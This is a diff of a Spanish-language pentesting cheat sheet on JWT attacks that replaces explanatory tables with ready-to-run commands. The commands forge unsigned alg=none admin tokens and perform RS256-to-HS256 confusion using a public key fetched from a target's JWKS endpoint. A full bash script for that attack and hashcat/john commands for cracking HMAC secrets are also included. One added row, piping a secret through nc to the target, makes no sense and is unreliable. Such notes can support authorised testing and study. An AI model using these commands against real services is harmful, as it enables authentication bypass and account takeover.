@@ -24,21 +24,18 @@ linked:
 
 ## alg=none Bypass
 
-| **Objetivo** | **Payload / Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Header alg none | `{"alg":"none","typ":"JWT"}` | Backend acepta tokens sin firma. |
-| Variantes case bypass | `none` / `None` / `NONE` / `nOnE` | Algunos validators solo blacklistean lowercase. |
-| Token sin firma | `<header_b64>.<payload_b64>.` | Tercer segmento vacío — punto final obligatorio. |
-| Token con firma vacía | `<header_b64>.<payload_b64>.` (signature null) | Equivalente al anterior — algunos parsers difieren. |
-| Forge con jwt_tool | `python3 jwt_tool.py <token> -X a` | Auto-genera variantes alg=none. |
-| Forge manual Python | `import jwt; jwt.encode(payload,'',algorithm='none')` | PyJWT con algorithm=none. |
-| Force unverified | `jwt.decode(token, options={'verify_signature':False})` | Backend mal configurado — vector. |
-| Confusion `alg`/`typ` | `{"typ":"none"}` o `{"alg":"NONE","typ":"JWT"}` | Validators que filtran solo `alg`. |
-| Empty alg | `{"alg":"","typ":"JWT"}` | String vacío en alg. |
-| `alg=null` | `{"alg":null}` | Null literal — algunos libs interpretan como none. |
+| `python3 jwt_tool.py $JWT -X a` | Auto-genera todas las variantes alg=none | Test rápido alg=none. |
+| `python3 -c "import jwt; print(jwt.encode({'sub':'admin','role':'admin'},'',algorithm='none'))"` | Forge token alg=none manual con PyJWT | Custom payload claims. |
+| Header `{"alg":"none","typ":"JWT"}` + payload + `.` (signature vacía) | Token forjado standard | Backend acepta `none` directo. |
+| Variantes case: `none`/`None`/`NONE`/`nOnE` | Bypass blacklist case-sensitive | Validator solo blacklistea lowercase. |
+| `{"alg":""}` (alg empty string) | Bypass via empty alg | Lib interpreta como none. |
+| `{"alg":null}` | Bypass via null literal | Algunos parsers tratan null como none. |
+| `{"typ":"none","alg":"HS256"}` | Bypass alg-only blacklist | Filter no chequea typ. |
 ^jwt-alg-none
 
-### Stylesheet de exploit
+### Forge alg=none Python
 
 ```python
 import base64, json
@@ -53,46 +50,52 @@ ___
 
 ## Algorithm Confusion (HS256 ↔ RS256)
 
-| **Objetivo** | **Payload / Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Token firmado con `RS256` (asym). Cambiar a `HS256` (sym) usando **clave pública RSA como secreto HMAC**. | Backend confunde el alg → valida con la pública como HMAC key. |
-| Obtener clave pública | `curl https://target/.well-known/jwks.json` | JWKS endpoint. |
-| Pública en JWT decode | `cut -d. -f1 \| base64 -d \| jq .jwk` | Si embebida en token. |
-| Pública vía /jwks o /openid-config | `curl https://target/.well-known/openid-configuration` | Discovery endpoint. |
-| Forge HS256 con jwt_tool | `python3 jwt_tool.py <token> -X k -pk public.pem` | Auto-confusion attack. |
-| Forge manual | `jwt.encode(payload, public_key_pem, algorithm='HS256')` | PyJWT — pasar pública como secret. |
-| Variante eliminar newlines | `tr -d '\n' < public.pem` | Algunos backends comparan bytes exactos. |
-| Variante con CR/LF | Probar pública con `\n` final, sin `\n`, con `\r\n` | Backend puede normalizar diferente. |
-| ECDSA → HMAC | `ES256 → HS256` con clave EC | Mismo principio, menos común. |
-| Public key recovery | Si tenés 2 firmas RS256 distintas → derivar la pública | Tooling: `jwt-pwn` / matemática RSA. |
+| `curl -s https://target/.well-known/jwks.json \| jq` | Obtener clave pública RSA | JWKS endpoint disponible. |
+| `curl -s https://target/.well-known/openid-configuration \| jq '.jwks_uri' \| xargs curl -s` | Discovery → JWKS | OIDC discovery endpoint. |
+| `python3 jwt_tool.py $JWT -X k -pk public.pem` | Auto-confusion RS256 → HS256 | Tenés clave pública. |
+| `python3 -c "import jwt; key=open('public.pem').read(); print(jwt.encode({'role':'admin'}, key, algorithm='HS256'))"` | Forge HS256 con pública como secret | PyJWT manual. |
+| `tr -d '\n' < public.pem` y reintentar firma | Pública sin newlines | Backend compara bytes exactos sin normalización. |
+| `printf "$(cat public.pem)\n"` (con `\n` final extra) | Pública con `\n` agregado | Backend con normalización distinta. |
+| `python3 jwk2pem.py jwks.json` (script dedicado) | Convertir JWK → PEM | JWKS solo entrega JWK format. |
 ^jwt-alg-confusion
 
-### Por qué funciona
+### RS256 → HS256 confusion completo
 
-- Backend usa `jwt.verify(token, key)` donde `key` se determina por `alg` declarado en el token (o por defecto la pública).
-- Validators ingenuos pasan **siempre la pública** sin distinguir alg.
-- Si el token declara HS256, el lib usa la pública como **bytes** para HMAC.
-- Atacante puede generar HMAC con esos mismos bytes → firma válida.
+```bash
+# 1. Obtener pública
+curl -s https://target/.well-known/jwks.json | jq '.keys[0]' > jwk.json
+
+# 2. JWK → PEM
+python3 -c "
+from jwcrypto import jwk
+import json
+key = jwk.JWK(**json.load(open('jwk.json')))
+print(key.export_to_pem().decode())
+" > public.pem
+
+# 3. Forge HS256 con pública como secret
+python3 jwt_tool.py "$JWT" -X k -pk public.pem
+```
 
 ___
 
 ## Weak Secret Bruteforce (HS256)
 
-| **Objetivo** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Hashcat HS256 | `hashcat -m 16500 token.txt rockyou.txt` | Modo 16500 = JWT. |
-| Hashcat con rules | `hashcat -m 16500 token.txt rockyou.txt -r best64.rule` | Aumenta cobertura. |
-| John the Ripper | `john --wordlist=rockyou.txt token.txt --format=HMAC-SHA256` | Alternativa CPU. |
-| jwtcrack | `jwtcrack <token>` | Tool dedicada — bruteforce charset corto. |
-| jwt_tool crack | `python3 jwt_tool.py <token> -C -d wordlist.txt` | All-in-one. |
-| Crack con secret guess | `secrets.txt`: `secret`, `password`, `123456`, `key`, `<app-name>`, `<dev-name>` | Defaults comunes. |
-| Mutaciones del secret | `secret`, `secret123`, `Secret!`, `SeCrEt`, `s3cr3t` | Reglas hashcat. |
-| Diccionarios JWT | `jwt-secrets-list` (assetnote), `Cracken` | Wordlists especializadas. |
-| Brute force charset | `hashcat -m 16500 -a 3 token.txt ?l?l?l?l?l?l?l?l` | Mask attack — hasta 8 chars lowercase. |
-| GPU specs | RTX 3090 ~1.5 GH/s HS256 | 8 chars alfanum ≈ horas. |
+| `hashcat -m 16500 jwt.txt rockyou.txt` | GPU brute HMAC secret | Secret < 12 chars probable. |
+| `hashcat -m 16500 jwt.txt rockyou.txt -r best64.rule` | Bruteforce con mutations rule | Cobertura ampliada. |
+| `hashcat -m 16500 -a 3 jwt.txt ?l?l?l?l?l?l?l?l` | Mask attack — 8 chars lowercase | Bruteforce sin wordlist. |
+| `john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt` | CPU bruteforce alternative | Sin GPU. |
+| `jwtcrack $JWT` | Tool dedicada brute charset corto | Secrets cortos. |
+| `python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt` | All-in-one con wordlist | Quick check. |
+| `git clone https://github.com/wallarm/jwt-secrets && hashcat -m 16500 jwt.txt jwt-secrets/jwt.secrets.list` | Wordlist específica JWT | Defaults conocidos. |
+| `echo -n 'jwt.txt:secret' \| nc target 80` (test default) | Probar secrets defaults manualmente: `secret`, `key`, `password`, `<app-name>` | Quick sanity check. |
 ^jwt-alg-bruteforce
 
-### Cuándo es factible
+### Cuándo es factible (referencia)
 
 | Longitud secret | Charset | GPU consumer | Tiempo estimado |
 |---|---|---|---|
@@ -102,6 +105,6 @@ ___
 | 10 chars | a-zA-Z0-9 | RTX 3090 | meses |
 | 12+ chars random | full | — | infactible |
 
-Si secret < 32 bytes random → probar bruteforce. Si > 32 bytes random → enfocarse en otros vectores (alg confusion / kid injection / leak).
+Si secret > 32 bytes random → enfocarse en otros vectores (alg confusion / kid injection / leak).
 
 ***
